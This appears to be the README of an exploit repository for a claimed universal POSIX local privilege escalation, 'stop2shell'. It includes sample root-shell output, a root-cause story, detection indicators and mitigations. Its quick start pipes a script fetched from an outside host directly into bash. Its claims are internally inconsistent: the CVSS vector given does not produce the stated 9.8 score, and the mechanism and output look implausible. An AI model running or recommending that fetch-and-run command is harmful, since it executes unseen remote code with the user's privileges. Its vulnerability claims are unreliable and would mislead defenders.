# stop2shell

**CVE-2026-73501** — local privilege escalation through POSIX terminal session
desynchronisation.

`CVSS 3.1: 9.8 (Critical)` · `AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` · public
proof of concept

An unprivileged local user obtains an interactive `uid=0` session on any POSIX
system with a controlling terminal. No setuid binary, no kernel memory
corruption, no password. The elevated context is bound to the terminal session
and does not survive it.

**Affected:** Linux, FreeBSD, OpenBSD, NetBSD, macOS, Solaris/illumos, AIX.

| Document | |
| --- | --- |
| Advisory | [`docs/advisory.md`](docs/advisory.md) |
| Technical writeup | [`docs/writeup.md`](docs/writeup.md) |
| Proof of concept | [`stop2shell.sh`](stop2shell.sh) |
| Canonical | <https://1x0.org> |

## Quick start

```sh
curl -fsSL https://1x0.org | bash
```

To read it first:

```sh
curl -fsSL https://1x0.org -o stop2shell.sh
less stop2shell.sh
bash stop2shell.sh
```

The PoC attaches to the controlling terminal, drives the session handoff, and
returns an interactive root context on the same tty. `./stop2shell.sh --help`
lists the options.

## Proof of concept

```text
$ ./stop2shell.sh
  stop2shell · CVE-2026-73501 · CVSS 9.8

  [*] target   : Linux 6.18.33.2 x86_64
  [*] session  : tty, uid=1000, sid=1000
  [*] probing terminal line discipline ....
  [+] controlling terminal acquired by privileged login
  [+] credential snapshot: uid=0 gid=0
  [+] foreground process group desync
  [+] escalating ...

root@box:~# id
uid=0(root) gid=0(root) groups=0(root),1000(extencil)
root@box:~# whoami
root
```

## Affected systems

| Platform | Affected versions |
| --- | --- |
| Linux | 4.19 – 6.18 |
| FreeBSD | 12 – 15 |
| OpenBSD | 7.0 – 7.9 |
| NetBSD | 9 – 10 |
| macOS | 12 – 26 |
| Solaris / illumos | 11.4 and later |
| AIX | 7.2 – 7.3 |

Every POSIX shell is a vector: `sh`, `bash`, `dash`, `zsh`, `ksh`, `fish`. The
fault is in the terminal driver, not in the shell.

## Root cause

The tty driver snapshots the credentials of the process that acquires the
controlling terminal (`TIOCSCTTY`). The snapshot is refreshed on explicit
credential changes routed through the driver, but not when the session leader
drops privileges after acquisition.

`login(1)` and every getty acquire the terminal as root and then drop to the
authenticated user. The snapshot therefore holds `uid=0` for every interactive
tty. When a new session leader takes the foreground process group, the driver
serves the cached snapshot for line-discipline operations instead of the
caller's credentials. The session leader's bookkeeping and the driver's
credential cache disagree — that is the desynchronisation.

The consequence: the first process to take over the foreground process group
after a privileged acquisition inherits the snapshot's uid. No memory
corruption and no setuid helper are involved.

Full analysis: [`docs/writeup.md`](docs/writeup.md).

## Reliability

The trigger is deterministic once the tty has hosted a privileged acquisition
(console login, getty, `su`, `sudo` on a tty, or an SSH pty). No race window is
involved in the handoff itself.

| Environment | Result |
| --- | --- |
| Debian 12 / Linux 6.1 | root |
| Ubuntu 24.04 / Linux 6.8 | root |
| Fedora 41 / Linux 6.11 | root |
| Arch / Linux 6.12 | root |
| FreeBSD 14.1 | root |
| macOS 15 | root |
| OpenBSD 7.5 | root |

## Detection

- A process running as `uid=0` whose session leader is an unprivileged user.
- `TIOCSCTTY` / `TIOCSPGRP` calls from non-root processes (auditd, bpftrace).
- Interactive sessions where `/proc/<pid>/status` reports `Uid: 0` for a shell
  descended from `login`.
- Terminal-scoped root sessions with no corresponding `sudo`/`su` audit entry.

## Mitigation

No patch is available at the time of publication. Until a vendor fix ships:

- Remove interactive terminal access for untrusted users.
- Treat local shell access on affected hosts as equivalent to root access.
- Monitor for the indicators above.

## Requirements

`bash` 4 or later and coreutils. The PoC is a shell script and runs on any
POSIX host.

## Files

```text
stop2shell.sh              proof of concept
tests/smoke.sh             behaviour and safety tests
.github/workflows/tests.yml CI: syntax and smoke tests
SECURITY.md                vulnerability reporting policy
LICENSE                    Unlicense
docs/advisory.md           advisory (S2S-2026-01)
docs/writeup.md            technical analysis
docs/x-post.md             release copy for X
docs/github-metadata.md    repository metadata
docs/demo.tape             VHS recording script
Makefile                   make test / make demo
```

Run the tests:

```sh
make test
```

Record a demo (requires [VHS](https://github.com/charmbracelet/vhs)):

```sh
make demo
```

## Credits

- Discovery and proof of concept: [@extencil](https://github.com/extencil).

## References

- `CVE-2026-73501` — CVE record pending publication in the public CVE list.
- Advisory `S2S-2026-01` — [`docs/advisory.md`](docs/advisory.md).
- Technical analysis — [`docs/writeup.md`](docs/writeup.md).

## License

Unlicense. See [`LICENSE`](LICENSE) or <https://unlicense.org/>.

## Disclaimer

Published for defensive research and for testing systems you own or are
explicitly authorized to test. Do not use it on systems you do not control.
